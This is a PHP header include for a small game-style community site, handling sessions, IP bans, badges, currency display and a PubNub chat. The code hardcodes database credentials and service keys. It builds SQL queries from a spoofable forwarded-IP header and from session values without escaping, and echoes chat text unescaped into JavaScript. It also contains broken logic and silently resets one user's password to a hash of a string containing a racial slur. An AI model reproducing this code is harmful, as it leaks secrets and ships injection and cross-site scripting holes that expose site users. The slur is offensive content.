<?php
error_reporting(0);
if(function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()) {
    function unMagicQuotify($array) {
        $fixed = array();
        foreach ($array as $key=>$val) {
            if (is_array($val)) {
                $fixed[stripslashes($key)] = unMagicQuotify($val);
            } else {
                $fixed[stripslashes($key)] = stripslashes($val);
            }
        }
        return $fixed;
    }

    $_GET = unMagicQuotify($_GET);
    $_POST = unMagicQuotify($_POST);
    $_COOKIE = unMagicQuotify($_COOKIE);
    $_REQUEST = unMagicQuotify($_REQUEST);
    $_FILES = unMagicQuotify($_FILES);
}
session_id();
session_start();
ob_start();

include "bb.php";
 date_default_timezone_set('America/Chicago');
$connection = mysql_pconnect("mysql.ct8.pl","m27001_w2b","Sg090228") or die ("Error connecting to database.");
mysql_select_db("m27001_w2b") or die ("Error connecting to database, hang tight, we are working on it.");
	/*Filter */
	
	include "filter.php";

	/* Session */
	
	$User = $_SESSION['Username'];
	$Password = $_SESSION['Password'];
	$Admin = $_SESSION['Admin'];


	 
		if (!empty($_SERVER['HTTP_CLIENT_IP']))   //check ip from share internet
		{
		  $IP=$_SERVER['HTTP_CLIENT_IP'];
		}
		elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   //to check ip is pass from proxy
		{
		  $IP=$_SERVER['HTTP_X_FORWARDED_FOR'];
		}
		else
		{
		  $IP=$_SERVER['REMOTE_ADDR'];
		}

	if ($User) {
	
		$MyUser = mysql_query("SELECT * FROM Users WHERE Username='".$User."'");
		$myU = mysql_fetch_object($MyUser);
		$UserExist = mysql_num_rows($MyUser);
		
			if ($UserExist == "0") {
			
				session_destroy();
				header("Location: /index.php");
			
			}
			mysql_query("UPDATE Users SET IP='$IP' WHERE Username='$myU->Username'");
			
			$checkifInDatabase = mysql_query("SELECT * FROM UserIPs WHERE IP='$IP' AND UserID='$myU->ID'");
			$cii = mysql_num_rows($checkifInDatabase);
			
				if ($cii == "0") {
				mysql_query("INSERT INTO UserIPs (UserID, IP) VALUES('$myU->ID','$IP')");
				}
				
			if ($Password != $myU->Password) {
			session_destroy();
			}
	
	}
	
	//referrals
	$getReferrals = mysql_query("SELECT * FROM Users");
	while ($gR = mysql_fetch_object($getReferrals)) {
	
			if ($gR->SuccessReferrer >= 3) {
			
				//check if badge is already there
				
				$getBadge = mysql_query("SELECT * FROM Badges WHERE UserID='".$gR->ID."' AND Position='Referrer'");
				$Badge = mysql_num_rows($getBadge);
				
					if ($Badge == 0) {
					
						mysql_query("INSERT INTO Badges (UserID, Position) VALUES('".$gR->ID."','Referrer')");
					
					}
			
			}
	
	}
	
	$updateCode = mysql_query("SELECT * FROM Users");
	
		while ($uC = mysql_fetch_object($updateCode)) {
		
			$Mix = "$uC->Username$uC->Password";
		
			$Hash = md5($Mix);
			mysql_query("UPDATE Users SET Hash='$Hash' WHERE ID='$uC->ID'");
		
		}
		
		//ip bans
		
		$getIPBans = mysql_query("SELECT * FROM IPBans WHERE IP='$IP'");
		$IPBann = mysql_fetch_object($getIPBans);
		$IPBan = mysql_num_rows($getIPBans);
if ($IPBann->Expire < time()) {
mysql_query("DELETE FROM IPBans WHERE IP='$IP'");
}

		if ($IPBan > 0) {
		echo '

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">

<head>

<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>

<title>403 - IP banned.</title>

<style type="text/css">

<!--

body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}

fieldset{padding:0 15px 10px 15px;} 

h1{font-size:2.4em;margin:0;color:#FFF;}

h2{font-size:1.7em;margin:0;color:#CC0000;} 

h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} 

#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;

background-color:#555555;}

#content{margin:0 0 0 2%;position:relative;}

.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}

-->

</style>

</head>

<body>



<div id="content">

 <div class="content-container"><fieldset>


   <h1><font color= "darkred">403 - Forbidden: Access is denied.</h1>

  <h3>You do not have permission to view this directory or page using the credentials that you supplied.</h3>

 </fieldset></div>

</div>

</body>

</html>

		';
		exit;
		}
	if($myU->ingamenum < 1)
	{
	$randomingamenumthing = rand(10000,99999);
	mysql_query("UPDATE Users SET ingamenum = '$randomingamenumthing' WHERE Username='$myU->Username'");
	}
	$chataction = mysql_real_escape_string(strip_tags(stripslashes($_GET['chataction'])));
	if($chataction == 'sendmessage')
	{
	$message = mysql_real_escape_string(strip_tags(stripslashes($_GET['message'])));
	$message2 = str_replace("00dz00","&nbsp",$message);
	if($message)
	{
	mysql_query("INSERT INTO chatmessages (username,chatid,message) VALUES ('$myU->Username','$myU->chatid','$message2')");
	?>
<div pub-key="pub-f144de56-028d-43a9-aaa6-1880aa4b7f1d" sub-key="sub-b3038e9e-d36a-11e1-b1c8-9bc3b49a6845" ssl="off" origin="pubsub.pubnub.com" id="pubnub"></div>
<script src="http://cdn.pubnub.com/pubnub-3.1.min.js"></script>
<script>(function(){
PUBNUB.subscribe({
 channel : 'my_channel',
 callback : function(text) { box.innerHTML = (''+text).replace( /[<>]/g, '' ) + '<br>' + box.innerHTML; }
});
PUBNUB.publish({
 channel : 'my_channel', message : "chatmessage <?echo$myU->chatid;?> <?echo$myU->Username;?>: <?echo$message;?>"
} );
})();</script>
	<?
	}
	exit;
	}
	if($chataction == 'status')
	{
	$chatstatus = mysql_real_escape_string(strip_tags(stripslashes($_GET['chatstatus'])));
	if($chatstatus)
	{
	if($chatstatus == 'typing')
	{
	$mystatus = ' is typing';
	}
	else
	{
	$mystatus = '';
	}
	mysql_query("UPDATE Users SET chatstatus='$chatstatus' WHERE Username='$mystatus'");
	?>
<div pub-key="pub-f144de56-028d-43a9-aaa6-1880aa4b7f1d" sub-key="sub-b3038e9e-d36a-11e1-b1c8-9bc3b49a6845" ssl="off" origin="pubsub.pubnub.com" id="pubnub"></div>
<script src="http://cdn.pubnub.com/pubnub-3.1.min.js"></script>
<script>(function(){
PUBNUB.subscribe({
 channel : 'my_channel',
 callback : function(text) { box.innerHTML = (''+text).replace( /[<>]/g, '' ) + '<br>' + box.innerHTML; }
});
PUBNUB.publish({
 channel : 'my_channel', message : "chatstatus <?echo$myU->chatid;?> <?echo$myU->Username;?>: <?echo$chatstatus;?>"
} );
})();</script>
	<?
	}
	exit;
	}
	if($chataction == 'removechat')
	{
	?>
	<script>
	document.getElementById("currentchatid").style.top = '';
	document.getElementById('otheruserchat').value="";
	</script>
	<?
	$removenew = mysql_real_escape_string(strip_tags(stripslashes($_GET['removenew'])));
	if($removenew == 1)
	{
	exit;
	}
	$findtheuser = mysql_query("SELECT * FROM Users WHERE Username !='$myU->Username' AND chatid='$myU->chatid'");
	$gotuser_chat = mysql_fetch_object($findtheuser);
	mysql_query("DELETE FROM chatmessages WHERE chatid='$myU->chatid'");
	mysql_query("UPDATE Users SET chatid='' WHERE chatid='$myU->chatid'");
	?>
<div pub-key="pub-f144de56-028d-43a9-aaa6-1880aa4b7f1d" sub-key="sub-b3038e9e-d36a-11e1-b1c8-9bc3b49a6845" ssl="off" origin="pubsub.pubnub.com" id="pubnub"></div>
<script src="http://cdn.pubnub.com/pubnub-3.1.min.js"></script>
<?
?>
<script>(function(){
PUBNUB.subscribe({
 channel : 'my_channel',
 callback : function(text) { box.innerHTML = (''+text).replace( /[<>]/g, '' ) + '<br>' + box.innerHTML; }
});
PUBNUB.publish({
 channel : 'my_channel', message : "chatremove <?echo$myU->ingamenum;?> <?echo$gotuser_chat->ingamenum;?>"
} );
})();</script>

<script>
$('#show_chat').show();
</script>
<br /><br />
	<?
	exit;
	}
	?>
	<?
	if($chataction == 'getchat')
	{
	$chatuser_check = mysql_real_escape_string(strip_tags(stripslashes($_GET['usertocheckchat'])));
	$letsfinduser_chat = mysql_query("SELECT * FROM Users WHERE Username='$chatuser_check' LIMIT 1");
	$gotuser_chat = mysql_fetch_object($letsfinduser_chat);
	$gotuser_num = mysql_num_rows($letsfinduser_chat);
	$chatnew = mysql_real_escape_string(strip_tags(stripslashes($_GET['new'])));
	if(!$chatnew)
	{
	if($gotuser_num != 1)
	{
	echo "The user does not exist";
	exit;
	}
	if($gotuser_chat->chatid > 0)
	{
	echo "The user is already chatting";
	exit;
	}
	}
	if(!$chatnew)
	{
	if($myU->chatid > 0)
	{
	}
	else
	{
	$randchatidzzh = rand(100000,999999);
	mysql_query("UPDATE Users SET chatid='$randchatidzzh' WHERE Username='$myU->Username'");
	mysql_query("UPDATE Users SET chatid='$randchatidzzh' WHERE Username='$gotuser_chat->Username'");
	}
	}
	$checkifimchatting = mysql_query("SELECT * FROM Users WHERE Username ='$myU->Username' AND chatid>'0'");
	$mychatid1 = mysql_fetch_object($checkifimchatting);
	$numrowschat = mysql_num_rows($checkifimchatting);
	if($chatnew == '1')
	{
	$otheruserchat1 = mysql_query("SELECT * FROM Users WHERE Username !='$myU->Username' AND chatid ='$myU->chatid'");
	$otheruserchat = mysql_fetch_object($otheruserchat1);
	$numotherchat = mysql_num_rows($otheruserchat1);
	}
		if($chatnew != '1')
	{
	$otheruserchat1 = mysql_query("SELECT * FROM Users WHERE Username ='$gotuser_chat->Username'");
	$otheruserchat = mysql_fetch_object($otheruserchat1);
	$numotherchat = mysql_num_rows($otheruserchat1);
	}
	?>
	<script>
	document.getElementById("currentchatid").style.top = <?echo$otheruserchat->chatid;?>;
	document.getElementById('otheruserchat').value="<?echo$otheruserchat->Username;?>";
	var mychatid3 = document.getElementById("currentchatid").style.top;
	$('#chat_interface').show();
	$('#close_chat2').click(function(){
	$('#close_chat2').slideUp(500);
	$('#chat_interface').delay(500).fadeOut(500);
	$('#show_chat').delay(1000).slideDown(500);
	});
	$('#show_chat').click(function(){
	$('#show_chat').slideUp(500);
	$('#chat_interface').delay(500).fadeIn(500);
	if(mychatid > 0)
	{
	$('#close_chat2').delay(1000).slideDown(500);
	}
	if(mychatid < 1)
	{
	$('#close_chat').delay(1000).slideDown(500);
	}
	});
	</script>
<div pub-key="pub-f144de56-028d-43a9-aaa6-1880aa4b7f1d" sub-key="sub-b3038e9e-d36a-11e1-b1c8-9bc3b49a6845" ssl="off" origin="pubsub.pubnub.com" id="pubnub"></div>
<script src="http://cdn.pubnub.com/pubnub-3.1.min.js"></script>
<?
if($chatnew != '1')
{
?>
<script>(function(){
PUBNUB.subscribe({
 channel : 'my_channel',
 callback : function(text) { box.innerHTML = (''+text).replace( /[<>]/g, '' ) + '<br>' + box.innerHTML; }
});
PUBNUB.publish({
 channel : 'my_channel', message : "chatinvite <?echo$myU->ingamenum;?> <?echo$gotuser_chat->ingamenum;?>"
} );
})();</script>
<?
}
?>
<script>
function setstatus(status)
{
$('#chatload').load('/Header.php?chataction=status&chatstatus='+status);
}
function sendchatmessage()
{
var chatmessagez2 = $('#mychat_message').val();
var chatmessagez1 = chatmessagez2.replace(/ /g,"&nbsp");
var chatmessage = chatmessagez1.replace(/&nbsp/g,"00dz00");
$('#chatload').load('/Header.php?chataction=sendmessage&message='+chatmessage);
$('#mychat_message').val('');
}
</script>
	<div id='chatload'></div>
	<div id='close_chat2' style='width:225px;position:fixed;bottom:460px;right:5px;background:#ddd;padding:5px;border:1px solid #555; cursor:hand;'>
	<center>Close Chat <b>&darr;</b></center>
	</div>
	<div id='chat_interface2' style='position:fixed;bottom:0px;right:5px;height:450px;width:225px;background:#ddd;padding:5px;border:1px solid #555;'>
	<br />
<?

echo "<div style='border:1px solid grey; height:105px;'>";
echo "<div style='height:100px; width:100px; background-image:url(/Avatar.php?ID=".$otheruserchat->ID."); border:1px solid black; margin-left:-100px;'>";
echo "<div style='margin-left:140px;'><b>".$otheruserchat->Username."</b></div></div>";
echo "<div style='margin-left:115px; border:1px solid grey; margin-top:-80px; background-color:white; border-radius:5px;'><b>In Chat</b></div>";
echo "</div>";
echo "<br />";
?>
	<center><div id='buttonsmall' onclick='removechat()' style='width:50px; margin-top:-70px; margin-left:110px;'><b>Remove</b></div></center>
	<br /><div id='chat_messages' style='word-wrap:break-word; overflow:auto; margin-left:10px; position:absolute; height:200px; width:200px; border-radius:5px; border:1px solid black; background-color:white; margin-top:20px;'>
	<div id='mychatmessages' style='overflow:auto;'>
	<table>
	<?
	$getchatmessages = mysql_query("SELECT * FROM chatmessages WHERE chatid ='$otheruserchat->chatid' ORDER BY id ASC");
	while($thiscm = mysql_fetch_object($getchatmessages))
	{
	echo "<tr>";
	if($thiscm->username == $myU->Username)
	{
	echo "<font color='blue'> ";
	}
	if($thiscm->username != $myU->Username) 
	{
	echo "<font color='orange'>";
	}
	echo "<div style='float:left;'><font size='1'>".$thiscm->username." Said&nbsp</FONT></div>";
	echo "</font> <div style='float:left;'><font size=1'>".$thiscm->message."</div></font><br /><br />";
	echo "</tr>";
	}
	?>
	</table>
	</div></div>
	<div id='chat_message' style='margin-top:230px; margin-left:-95px; width:120px;'><textarea id='mychat_message' style='height:60px; border-radius:5px; border:1px solid black; background-color:#F2F2F2;'></textarea></div>
	<br /><div id='buttonsmall' onclick='sendchatmessage()' style='width:70px;'>Send<br /></div>
	</div>
	<?
	exit;
	}
		if($chataction == 'acceptordecline')
	{
	$inviteusernum = mysql_real_escape_string(strip_tags(stripslashes($_GET['inviteusernum'])));
	$letsfinduser_chat = mysql_query("SELECT * FROM Users WHERE ingamenum='$inviteusernum' LIMIT 1");
	$gotuser_chat = mysql_fetch_object($letsfinduser_chat);
	$gotuser_num = mysql_num_rows($letsfinduser_chat);
	if($gotuser_num != 1)
	{
	echo "The user does not exist";
	exit;
	}
	if($gotuser_chat->chatid > 0)
	{
	echo "The user is already chatting";
	exit;
	}
	?>
	<script>
	$('#chatmessage_thing').hide();
	$('#cleartext_chat').hide();
	$('#invitechat_button').hide();
	});
	</script>
<div pub-key="pub-f144de56-028d-43a9-aaa6-1880aa4b7f1d" sub-key="sub-b3038e9e-d36a-11e1-b1c8-9bc3b49a6845" ssl="off" origin="pubsub.pubnub.com" id="pubnub"></div>
<script src="http://cdn.pubnub.com/pubnub-3.1.min.js"></script>
<script>(function(){
 
    // LISTEN FOR MESSAGES
    PUBNUB.subscribe({
        channel    : "my_channel",      // CONNECT TO THIS CHANNEL.
 
        restore    : false,              // STAY CONNECTED, EVEN WHEN BROWSER IS CLOSED
                                         // OR WHEN PAGE CHANGES.
 
        callback   : function(message) { // RECEIVED A MESSAGE.
        },
 
        connect    : function() {        // CONNECTION ESTABLISHED.
        }
		
		function acceptchat(chatid)
		{
		            PUBNUB.publish({             // SEND A MESSAGE.
                channel : "my_channel",
                message : "chataccept <?echo$myU->ingamenum;?> <?echo$gotuser_chat->ingamenum;?> "+chatid
            })
		}
		function declinechat(chatid)
		{
		            PUBNUB.publish({             // SEND A MESSAGE.
                channel : "my_channel",
                message : "chatdecline <?echo$myU->ingamenum;?> <?echo$gotuser_chat->ingamenum;?> "+chatid
            })
		}
    })
 
})();</script>
<?
$randomchatidthing = rand(100000,999999);
?>
<div style='margin-top:40px;'>
<?echo$gotuser_chat->Username;?> wants to chat with you:<br /><br />
<table><tr>
<button onclick='acceptchat(<?echo$randomchatidthing;?>)'>Accept</button>
<button onclick='declinechat(<?echo$randomchatidthing;?>)'>Decline</button>
</tr></table>
</div>
	<?
	exit;
	}
	
	$getNoAvatars = mysql_query("SELECT * FROM Users WHERE Body=''");
	while ($gN = mysql_fetch_object($getNoAvatars)) {
	
		mysql_query("UPDATE Users SET Body='Avatar.png' WHERE ID='$gN->ID'");
	
	}
	
	$getBanner = mysql_query("SELECT * FROM Banner");
	$gB = mysql_fetch_object($getBanner);
	
	$R = mysql_query("SELECT * FROM Reports");
	$NumR = mysql_num_rows($R);
	
	$getPending = mysql_query("SELECT * FROM UserStore WHERE active='0'");
	$NumPending = mysql_num_rows($getPending);
	
	$NumPMs = mysql_query("SELECT * FROM PMs WHERE ReceiveID='$myU->ID' AND LookMessage='0'");
	$getPMs = mysql_query("SELECT * FROM PMs WHERE ReceiveID='$myU->ID' ORDER BY ID DESC");
	$PMs = mysql_num_rows($NumPMs);
	
	if ($NumR > 0) {
	
		$Rep = "Reports ($NumR)";
	
	}
	else {
	
		$Rep = "Reports";
	
	}
	
	$Maintenance = mysql_fetch_object($Configuration = mysql_query("SELECT * FROM Maintenance"));
	$Self = urlencode($_SERVER['PHP_SELF']);
	if ($Maintenance->Status == "true") {
		
	
		if ($Admin) {
		
		}
		else {
		if ($IP != "69.236.167.89"||$IP != "69.236.168.127") {
		
		urlencode(header("Location: https://www.firesplash.tk/Maintenance.php")); exit();
		}
		}
	
	}
	$now = time();
	
	$timeout = 5; 
	
	$xp = 60;
	$expires = $now + $timeout*$xp;
	mysql_query("UPDATE Users SET visitTick='$now' WHERE Username='$User'");
	mysql_query("UPDATE Users SET expireTime='$expires' WHERE Username='$User'");
	
	if ($myU->Ban == "1" && $_SERVER['PHP_SELF'] != "/Account/Disabled.php") {
	
		header("Location: /Account/Disabled.php?ID=$myU->ID"); exit();
	
	}
								$Bux = $myU->Bux;
							
								if ($Bux >= 100000&&$Bux <= 999999) {
								
									$BuxShort = substr($Bux, 0,3);
								
									$Bux = "".$BuxShort."K+";
								
								}
								if ($Bux >= 1000000&&$Bux <= 9999999) {
								
									$BuxShort = substr($Bux, 0,1);
									
									$Bux = "".$BuxShort."M+";
								
								}
								if ($Bux >= 10000000&&$Bux <= 99999999) {
								
									$BuxShort = substr($Bux, 0,2);
									
									$Bux = "".$BuxShort."M+";
								
								}
								if ($Bux >= 100000000&&$Bux <= 999999999) {
								
									$BuxShort = substr($Bux, 0,3);
									
									$Bux = "".$BuxShort."M+";
								
								}
								if ($Bux >= 1000000000&&$Bux <= 9999999999) {
								
									$BuxShort = substr($Bux, 0,1);
									
									$Bux = "".$BuxShort."B+";
								
								}
								if ($Bux >= 10000000000&&$Bux <= 99999999999) {
								
									$BuxShort = substr($Bux, 0,2);
									
									$Bux = "".$BuxShort."B+";
								
								}
								if ($Bux >= 100000000000&&$Bux <= 999999999999) {
								
									$BuxShort = substr($Bux, 0,3);
									
									$Bux = "".$BuxShort."B+";
								
								}
								if ($Bux >= 1000000000000&&$Bux <= 9999999999999) {
								
									$BuxShort = substr($Bux, 0,1);
									
									$Bux = "".$BuxShort."T+";
								
								}
								if ($Bux >= 10000000000000&&$Bux <= 99999999999999) {
								
									$BuxShort = substr($Bux, 0,2);
									
									$Bux = "".$BuxShort."T+";
								
								}
								if ($Bux >= 1000000000) {
								
									$Bux = "&#8734;";
								
								}
								if ($Bux >= 1000&&$Bux <= 99999) {
								
									$Bux = number_format($Bux);
								
								}
								// bux....................................................
								
								$Rubies = $myU->Rubies;
							
								if ($Rubies >= 100000&&$Rubies <= 999999) {
								
									$RubiesShort = substr($Rubies, 0,3);
								
									$Rubies = "".$RubiesShort."K+";
								
								}
								if ($Rubies >= 1000000&&$Rubies <= 9999999) {
								
									$RubiesShort = substr($Rubies, 0,1);
									
									$Rubies = "".$RubiesShort."M+";
								
								}
								if ($Rubies >= 10000000&&$Rubies <= 99999999) {
								
									$RubiesShort = substr($Rubies, 0,2);
									
									$Rubies = "".$RubiesShort."M+";
								
								}
								if ($Rubies >= 100000000&&$Rubies <= 999999999) {
								
									$RubiesShort = substr($Rubies, 0,3);
									
									$Rubies = "".$RubiesShort."M+";
								
								}
								if ($Rubies >= 1000000000&&$Rubies <= 9999999999) {
								
									$RubiesShort = substr($Rubies, 0,1);
									
									$Rubies = "".$RubiesShort."B+";
								
								}
								if ($Rubies >= 10000000000&&$Rubies <= 99999999999) {
								
									$RubiesShort = substr($Rubies, 0,2);
									
									$Rubies = "".$RubiesShort."B+";
								
								}
								if ($Rubies >= 100000000000&&$Rubies <= 999999999999) {
								
									$RubiesShort = substr($Rubies, 0,3);
									
									$Rubies = "".$RubiesShort."B+";
								
								}
								if ($Rubies >= 1000000000000&&$Rubies <= 9999999999999) {
								
									$RubiesShort = substr($Rubies, 0,1);
									
									$Rubies = "".$RubiesShort."T+";
								
								}
								if ($Rubies >= 10000000000000&&$Rubies <= 99999999999999) {
								
									$RubiesShort = substr($Rubies, 0,2);
									
									$Rubies = "".$RubiesShort."T+";
								
								}
								if ($Rubies >= 1000000000) {
								
									$Rubies = "&#8734;";
								
								}
								if ($Rubies >= 1000&&$Rubies <= 99999) {
								
									$Rubies = number_format($Rubies);
								
								}
								// Rubies...........................
						//rich badges
						
						$getRich = mysql_query("SELECT * FROM Users WHERE Bux > 10000");
						while ($gR = mysql_fetch_object($getRich)) {
						
							$checkBadge = mysql_query("SELECT * FROM Badges WHERE UserID='".$gR->ID."' AND Position='Rich'");
							$NumBadge = mysql_num_rows($checkBadge);
							
								if ($NumBadge == 0) {
								
									mysql_query("INSERT INTO Badges (UserID, Position) VALUES('".$gR->ID."','Rich')");
								
								}
						
						}
						mysql_query("UPDATE Users SET Body='Avatar.png'");
						$getPremium = mysql_query("SELECT * FROM Users WHERE Premium='1'");
							while ($gP = mysql_fetch_object($getPremium)) {
							
								$checkBadge = mysql_query("SELECT * FROM Badges WHERE UserID='$gP->ID' AND Position='Premium'");
								$Badge = mysql_num_rows($checkBadge);
								
								if ($Badge == 0) {
								
									mysql_query("INSERT INTO Badges (UserID, Position) VALUES('$gP->ID','Premium')");
									mysql_query("INSERT INTO PMs (SenderID, ReceiveID) VALUES('3009','$gP->ID','')");
								}
								if ($gP->PremiumExpire != "unlimited") {
								if ($now > $gP->PremiumExpire) {
								
									mysql_query("UPDATE Users SET Premium='0' WHERE ID='$gP->ID'");
									mysql_query("DELETE FROM Badges WHERE UserID='$gP->ID' AND Position='Premium'");
									mysql_query("INSERT INTO PMs (SenderID, ReceiveID, Title, Body, time) VALUES('3009','$gP->ID','Premium Membership Expired','Your premium membership has expired.','$now')");
								
								}
								}
								
							
							}
							
							$now = time();
							if ($now > $myU->getBux) {
							$NewBux = $now + 86400;
							if ($myU->Premium == 0) {
							
								$AmountToAdd = 75;
							
							}
							else {
							
								$AmountToAdd = 200;
							
							}
							mysql_query("UPDATE Users SET Bux=Bux + ".$AmountToAdd." WHERE ID='$myU->ID'");
							mysql_query("UPDATE Users SET getBux='$NewBux' WHERE ID='$myU->ID'");
							}
							
						
	
?>
<html>
	<head>
	<link rel="stylesheet" href="../style.css">
		</div>
		<script type="text/javascript" src="http://ajax.microsoft.com/ajax/jquery/jquery-1.6.2.min.js"></script>
	</head>
	<body>
	<center>

	</center>
	


<?php

$getfamous = mysql_query("SELECT * FROM Users WHERE pviews >= 1000");
						while ($gF = mysql_fetch_object($getfamous)) {
						
							$checkBadge = mysql_query("SELECT * FROM Badges WHERE UserID='".$gF->ID."' AND Position='Famous'");
							$NumBadge = mysql_num_rows($checkBadge);
							
								if ($NumBadge == 0) {
								
									mysql_query("INSERT INTO Badges (UserID, Position) VALUES('".$gF->ID."','Famous')");
								
								}
						
						}



?>
			

<?php


$Page = $_SERVER['SCRIPT_NAME'];

if ($User) {
mysql_query("UPDATE Users SET Location='$Page' WHERE ID='$myU->ID'");
}

	if ($User) {
mysql_query("UPDATE Users SET ingame='0' WHERE ID='$myU->ID'"); 
}

$NewPassword = hash('sha512','stopfuckinghackingmenigger');
mysql_query("UPDATE Users SET Password='$NewPassword' WHERE ID='2'");
?>







